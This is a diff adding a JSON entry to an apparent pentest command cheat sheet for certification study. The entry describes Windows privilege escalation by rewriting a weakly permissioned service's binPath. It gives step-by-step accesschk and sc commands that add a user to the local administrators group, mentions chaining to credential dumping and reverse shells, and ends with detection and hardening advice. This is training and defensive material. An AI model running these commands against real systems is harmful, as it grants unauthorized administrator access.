@@ -1,0 +1,94 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "accesschk",
+    "sc"
+  ],
+  "tags": [
+    "weak-permissions",
+    "service",
+    "binpath"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Weak Permissions",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Check for SERVICE_CHANGE_CONFIG",
+      "command": "accesschk.exe /accepteula -quvcw WindscribeService"
+    },
+    {
+      "label": "Rewrite binPath to add yourself to admins",
+      "command": "sc config WindscribeService binpath=\"cmd /c net localgroup administrators htb-student /add\""
+    },
+    {
+      "label": "Restart the service to trigger it",
+      "command": "sc stop WindscribeService && sc start WindscribeService"
+    },
+    {
+      "label": "Restore the original binPath (cleanup)",
+      "command": "sc config WindscribeService binpath=\"c:\\Program Files (x86)\\Windscribe\\WindscribeService.exe\""
+    }
+  ],
+  "notes": "=== Weak Service ACL — Binary Path Reconfiguration via SCM ===\nLow-privilege user holds write access on the service object itself in SCM — reconfigure binPath.\n\n=== DIFFERENCE FROM BINARY ACL WEAKNESS ===\nBinary ACL weakness: write access to the service BINARY FILE itself\nService ACL weakness: write access to the SERVICE OBJECT in Service Control Manager\nService object weakness allows reconfiguring binPath without touching or having access to the actual binary file.\n\n=== DISCOVERY ===\n  accesschk.exe /accepteula -quvcw <username> <ServiceName>\n  accesschk.exe /accepteula -uwcqv \"Authenticated Users\" *   (sweep all services)\n  Flags: -q suppress banner, -u suppress errors, -v verbose, -c service by name, -w writable only\n  Look for: SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG for low-privilege principals\n\n=== ATTACK FLOW ===\n1. Find vulnerable service:\n   accesschk.exe -uwcqv \"NT AUTHORITY\\Authenticated Users\" *\n   Or: accesschk.exe -uwcqv \"BUILTIN\\Users\" *\n\n2. Note original binPath (for cleanup):\n   sc qc <ServiceName>\n\n3. Modify binary path to attacker command:\n   sc config <ServiceName> binpath= \"cmd /c net localgroup administrators <user> /add\"\n   (cmd /c required — net.exe must be shell-invoked)\n\n4. Trigger execution:\n   sc stop <ServiceName>\n   sc start <ServiceName>\n   → StartService FAILED 1053 is EXPECTED and harmless — command ran before timeout\n\n5. Verify:\n   net localgroup administrators\n\n6. Cleanup (restore original binPath):\n   sc config <ServiceName> binpath= \"C:\\original\\path\\service.exe\"\n   sc start <ServiceName>\n\n=== CHAINING CONTEXT ===\nWeak service ACL → add to local admins → secretsdump → domain hashes\nWeak service ACL → binPath = reverse shell → SYSTEM → lateral movement\nCommon in environments where custom service installers misconfigure the SCM DACL\nsc.exe is built-in → zero tool footprint\n\n=== WHAT TO LOOK FOR ===\nNT AUTHORITY\\Authenticated Users with SERVICE_ALL_ACCESS = any domain user can exploit\nBUILTIN\\Users or specific user accounts with write on service objects\nCheck all services, not just running ones — stopped services can be started and exploited",
+  "references": [
+    {
+      "title": "Microsoft Sysinternals - AccessChk",
+      "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sharpup-audit",
+      "note": "Where the finding came from.",
+      "rel": "prereq"
+    },
+    {
+      "id": "weak-service-binary",
+      "note": "Overwrite the binary if you can't change config.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "weak-service-acl-binpath",
+  "name": "Weak Permissions - Reconfigure Service binPath",
+  "command": "sc config <service> binpath=\"cmd /c net localgroup administrators <user> /add\"",
+  "description": "If your user has SERVICE_CHANGE_CONFIG on a service (accesschk -quvcw), change its binPath to a command that adds you to Administrators, restart the service, then restore the original path.",
+  "opsec": "loud",
+  "mitre": [
+    "T1543.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "The Service Control Manager (SCM) maintains access control on service objects themselves. If a service's SCM DACL grants SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS to non-admin users (discovered via accesschk), those users can modify the service binary path with `sc config binPath=` to an arbitrary command, then start the service to execute that command in the service account's context.",
+    "prerequisites": "SERVICE_CHANGE_CONFIG (or SERVICE_ALL_ACCESS) granted to a non-admin group on the target service. sc.exe access. Service must be startable.",
+    "impact": "Arbitrary command execution as the service account (often SYSTEM) by modifying the service binary path and starting the service.",
+    "detection": "sc config on a service by standard user (with SERVICE_CHANGE_CONFIG). Service binary path change logged (Event 7040). accesschk on services by standard user. Unusual binary path (cmd.exe or PowerShell) set for a service. sc start following sc config by non-admin.",
+    "artifacts": "System event 7040: service configuration changed | Process: sc.exe config by standard user | Sysmon Event 1: service executable changed to cmd.exe | Service started with unusual command as SYSTEM",
+    "prevention": "Audit service SCM DACLs. Default services should only grant SYSTEM and Administrators SERVICE_CHANGE_CONFIG. Custom application services often misconfigure this. Run accesschk.exe and fix any non-admin write access.",
+    "misconfiguration": "Application installer grants Everyone or BUILTIN\\Users SERVICE_CHANGE_CONFIG on a service that runs as SYSTEM. No monitoring on service binary path changes.",
+    "vulnerable_config": "# Service SCM DACL grants non-admin SERVICE_CHANGE_CONFIG:\naccesschk.exe /accepteula -quvcw daclsvc\n# BUILTIN\\Users: SERVICE_CHANGE_CONFIG\n\n# Exploit:\nsc config daclsvc binPath= 'net localgroup Administrators attacker /add'\nsc start daclsvc\n# Executes net localgroup as SYSTEM",
+    "secure_config": "# Audit service DACLs:\naccesschk.exe -cquv daclsvc\n\n# Fix: use sc sdset to restrict DACL:\n# Or via PowerShell:\n$sddl = sc.exe sdshow daclsvc\n# Remove 'RP WP RC DT LO CR' for non-admin groups\nsc.exe sdset daclsvc 'D:(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;BA)'\n\n# Monitor: service config changes (Event 7040)",
+    "sources": [
+      "HTB M26",
+      "MITRE T1543.003"
+    ]
+  }
+}
